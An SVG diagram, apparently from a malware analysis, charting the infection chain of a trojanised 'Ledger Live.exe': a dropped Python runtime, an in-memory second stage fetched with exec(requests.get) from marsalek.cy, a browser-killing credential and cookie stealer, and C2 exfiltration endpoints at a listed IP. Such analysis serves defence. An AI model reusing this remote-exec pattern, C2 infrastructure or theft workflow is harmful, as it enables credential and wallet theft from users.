<rect x="70" y="96" width="560" height="54" rx="10" fill="#FAECE7" stroke="#993C1D" stroke-width="0.75"/>
<text x="350" y="117" text-anchor="middle" dominant-baseline="central" font-size="14" font-weight="500" fill="#712B13">Ledger Live.exe runs</text>
<text x="350" y="134" text-anchor="middle" dominant-baseline="central" font-size="12" fill="#993C1D">drops a private Python to %APPDATA%\Google\python\</text>
<rect x="70" y="172" width="560" height="54" rx="10" fill="#FAECE7" stroke="#993C1D" stroke-width="0.75"/>
<text x="350" y="193" text-anchor="middle" dominant-baseline="central" font-size="14" font-weight="500" fill="#712B13">wscript r.vbs bootstraps pip</text>
<text x="350" y="210" text-anchor="middle" dominant-baseline="central" font-size="12" fill="#993C1D">installs cryptography, requests, setuptools</text>
<rect x="70" y="248" width="560" height="54" rx="10" fill="#FAECE7" stroke="#993C1D" stroke-width="0.75"/>
<text x="350" y="269" text-anchor="middle" dominant-baseline="central" font-size="14" font-weight="500" fill="#712B13">Second stage fetched in memory</text>
<text x="350" y="286" text-anchor="middle" dominant-baseline="central" font-size="12" fill="#993C1D">python exec(requests.get marsalek.cy/paste)</text>
<rect x="70" y="324" width="560" height="54" rx="10" fill="#FCEBEB" stroke="#A32D2D" stroke-width="0.75"/>
<text x="350" y="345" text-anchor="middle" dominant-baseline="central" font-size="14" font-weight="500" fill="#791F1F">Pentagon stealer (svc.py)</text>
<text x="350" y="362" text-anchor="middle" dominant-baseline="central" font-size="12" fill="#A32D2D">pip pycryptodome, pywin32, psutil</text>
<rect x="70" y="400" width="560" height="54" rx="10" fill="#FCEBEB" stroke="#A32D2D" stroke-width="0.75"/>
<text x="350" y="421" text-anchor="middle" dominant-baseline="central" font-size="14" font-weight="500" fill="#791F1F">Mass browser kill + credential theft</text>
<text x="350" y="438" text-anchor="middle" dominant-baseline="central" font-size="12" fill="#A32D2D">taskkill ~20 browsers; reads passwords, cookies, clipboard</text>
<rect x="70" y="476" width="560" height="54" rx="10" fill="#FCEBEB" stroke="#A32D2D" stroke-width="0.75"/>
<text x="350" y="497" text-anchor="middle" dominant-baseline="central" font-size="14" font-weight="500" fill="#791F1F">C2 exfiltration</text>
<text x="350" y="514" text-anchor="middle" dominant-baseline="central" font-size="12" fill="#A32D2D">POST marsalek.cy (185.178.208.168): /create_log, /log_data</text>
